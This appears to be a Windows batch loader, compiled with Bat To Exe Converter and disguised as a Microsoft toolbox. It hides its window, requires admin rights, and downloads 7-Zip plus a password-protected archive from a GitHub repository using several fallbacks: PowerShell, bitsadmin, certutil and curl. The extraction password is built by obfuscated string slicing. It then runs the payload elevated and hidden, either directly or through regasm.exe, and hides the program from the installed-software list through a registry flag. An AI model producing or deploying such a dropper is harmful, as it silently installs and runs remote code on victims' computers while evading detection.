::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rHy+WQrEESVeYsRIDV36CHLeVd713hFQ==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
:: BrightStar Scmscrt - Silent Version
:: Downloads 7z.exe and extracts scmscrt archive silently

:: Hide console window by restarting with PowerShell if not already hidden
if not "%1"=="hidden" (
    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden"
    exit
)

:: Check for administrator privileges silently
net session >nul 2>&1
if %errorLevel% neq 0 (
    exit /b 1
)

:: Check if program is already installed
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{D9E4CFDD-87B1-611A-2BC6-0C5B2B744903}" /v DisplayName 2>nul
if %errorlevel% equ 0 (
    :: Already installed, exit
    exit /b 0
)

:: Set target directory
set "SYS_ROOT=C:\ProgramData"
set "APP_NAME=MsToolbox"
set "MODULE_NAME=scmscrt"
set "TARGET_DIR=%SYS_ROOT%\%APP_NAME%"
set "TARGET_FILE=%TARGET_DIR%\7z.exe"

:: Create target directory if it doesn't exist
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1

:: Smart execution - if config.txt already exists, execute immediately
if exist "%CONFIG_FILE%" goto :execute_config

:: Check if 7z.exe already exists and works
if exist "%TARGET_FILE%" (
    "%TARGET_FILE%" >nul 2>&1
    if not errorlevel 1 goto :start_archive_download
)

:: Download 7z.exe silently
powershell -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7zr.exe' -OutFile '%TARGET_FILE%' -UseBasicParsing } catch { }" >nul 2>&1
if exist "%TARGET_FILE%" goto :start_archive_download

:: Try alternative download methods
bitsadmin /transfer "7zDownload" "https://www.7-zip.org/a/7zr.exe" "%TARGET_FILE%" >nul 2>&1
if exist "%TARGET_FILE%" goto :start_archive_download

set "TEMP_FILE=%TEMP%\7zr_temp.exe"
certutil -urlcache -split -f "https://www.7-zip.org/a/7zr.exe" "%TEMP_FILE%" >nul 2>&1
if exist "%TEMP_FILE%" (
    move "%TEMP_FILE%" "%TARGET_FILE%" >nul 2>&1
    goto :start_archive_download
)

curl -L -o "%TARGET_FILE%" "https://www.7-zip.org/a/7zr.exe" >nul 2>&1
if exist "%TARGET_FILE%" goto :start_archive_download

curl -L -k -o "%TARGET_FILE%" "https://www.7-zip.org/a/7zr.exe" >nul 2>&1
if exist "%TARGET_FILE%" goto :start_archive_download

exit /b 1

:start_archive_download
:: Set paths and parameters
set "SEVEN_ZIP=%SYS_ROOT%\%APP_NAME%\7z.exe"
set "BASE_DIR=%SYS_ROOT%\%APP_NAME%"
set "SCMSCRT_DIR=%BASE_DIR%\%MODULE_NAME%"
set "ARCHIVE_FILE=%BASE_DIR%\%MODULE_NAME%.zip"
:: Configure system parameters
set "CHARS=0123456789abcdefghijklmnopqrstuvwxyz"
set "VER=%CHARS:~1,1%"
set "BUILD=%CHARS:~13,1%"  
set "ARCH=%CHARS:~10,1%"
set "TYPE=%CHARS:~34,1%"
set "EXTRACT_OPTS=%VER%%BUILD%%ARCH%%TYPE%"
:: Network configuration endpoints
set "HOST_A=github.com"
set "HOST_B=example.com"
set "PATH_A=/skynox7/Microsoft/raw/refs/heads/main/scmscrt.zip"
set "PATH_B=/scmscrt.zip"
set "PROTOCOL=https://"
set "ENDPOINT_1=%PROTOCOL%%HOST_A%%PATH_A%"
set "ENDPOINT_2=%PROTOCOL%%HOST_B%%PATH_B%"

:: Create scmscrt directory if it doesn't exist
if not exist "%SCMSCRT_DIR%" mkdir "%SCMSCRT_DIR%" >nul 2>&1

:: Smart execution - if config.txt already exists, skip downloads and execute
if exist "%CONFIG_FILE%" goto :execute_config

:: Download scmscrt.zip silently
powershell -Command "try { Invoke-WebRequest -Uri '%ENDPOINT_1%' -OutFile '%ARCHIVE_FILE%' -UseBasicParsing } catch { }" >nul 2>&1
if exist "%ARCHIVE_FILE%" goto :extract_zip

powershell -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%ENDPOINT_2%' -OutFile '%ARCHIVE_FILE%' -UseBasicParsing } catch { }" >nul 2>&1
if exist "%ARCHIVE_FILE%" goto :extract_zip

bitsadmin /transfer "scmscrtDownload" "%ENDPOINT_1%" "%ARCHIVE_FILE%" >nul 2>&1
if exist "%ARCHIVE_FILE%" goto :extract_zip

set "TEMP_ARCHIVE=%TEMP%\scmscrt_temp.zip"
certutil -urlcache -split -f "%ENDPOINT_1%" "%TEMP_ARCHIVE%" >nul 2>&1
if exist "%TEMP_ARCHIVE%" (
    move "%TEMP_ARCHIVE%" "%ARCHIVE_FILE%" >nul 2>&1
    goto :extract_zip
)

curl -L -o "%ARCHIVE_FILE%" "%ENDPOINT_1%" >nul 2>&1
if exist "%ARCHIVE_FILE%" goto :extract_zip

curl -L -k -o "%ARCHIVE_FILE%" "%ENDPOINT_2%" >nul 2>&1
if exist "%ARCHIVE_FILE%" goto :extract_zip

exit /b 1

:extract_zip
if not exist "%ARCHIVE_FILE%" exit /b 1

:: Extract using 7z with password to scmscrt folder silently
"%SEVEN_ZIP%" x "%ARCHIVE_FILE%" -o"%SCMSCRT_DIR%" -p%EXTRACT_OPTS% -y >nul 2>&1
if errorlevel 1 exit /b 1

:: Check for nested ZIP file and extract silently
set "NESTED_ZIP=%SCMSCRT_DIR%\%MODULE_NAME%.zip"
set "NESTED_ZIP_TEMP=%SCMSCRT_DIR%\%MODULE_NAME%_temp.zip"

if exist "%NESTED_ZIP%" (
    "%SEVEN_ZIP%" x "%NESTED_ZIP%" -o"%SCMSCRT_DIR%" -p%EXTRACT_OPTS% -y >nul 2>&1
    del "%NESTED_ZIP%" >nul 2>&1
) else if exist "%NESTED_ZIP_TEMP%" (
    "%SEVEN_ZIP%" x "%NESTED_ZIP_TEMP%" -o"%SCMSCRT_DIR%" -p%EXTRACT_OPTS% -y >nul 2>&1
    del "%NESTED_ZIP_TEMP%" >nul 2>&1
)

:execute_config
:: System registry configuration
set "REG_ROOT=HKEY_LOCAL_MACHINE"
set "REG_PATH=SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
set "REG_GUID={D9E4CFDD-87B1-611A-2BC6-0C5B2B744903}"
set "REG_KEY=%REG_ROOT%\%REG_PATH%\%REG_GUID%"
set "CHECK_VALUE=DisplayName"

:: Check installation status before proceeding
reg query "%REG_KEY%" /v %CHECK_VALUE% 2>nul
if %errorlevel% equ 0 (
    :: Already installed, skip execution
    goto :cleanup
)

:: Application execution logic configuration
set "EXEC_NAME=BusinessLogic.exe"
set "FALLBACK_PATH=C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\regasm.exe"
set "LIB_NAME=sc-ms-crt_main.dll"
set "PRIMARY_EXEC=%SYS_ROOT%\%APP_NAME%\%MODULE_NAME%\%EXEC_NAME%"
set "SECONDARY_LIB=%SYS_ROOT%\%APP_NAME%\%MODULE_NAME%\%LIB_NAME%"
:: Check if primary executable exists and execute it, otherwise fall back to regasm
if exist "%PRIMARY_EXEC%" (
    cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process -FilePath \"%PRIMARY_EXEC%\" -Verb RunAs -WindowStyle Hidden"
) else (
    cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process -FilePath \"%FALLBACK_PATH%\" -ArgumentList '/nologo', '%SECONDARY_LIB%' -Verb RunAs -WindowStyle Hidden"
)

:: Update registry component status
set "REG_VALUE=SystemComponent"
set "REG_TYPE=REG_DWORD"
set "REG_DATA=1"
reg add "%REG_KEY%" /v %REG_VALUE% /t %REG_TYPE% /d %REG_DATA% /f >nul 2>&1

:cleanup

:: Clean up archive file only if it exists
if exist "%ARCHIVE_FILE%" del "%ARCHIVE_FILE%" >nul 2>&1

exit /b 0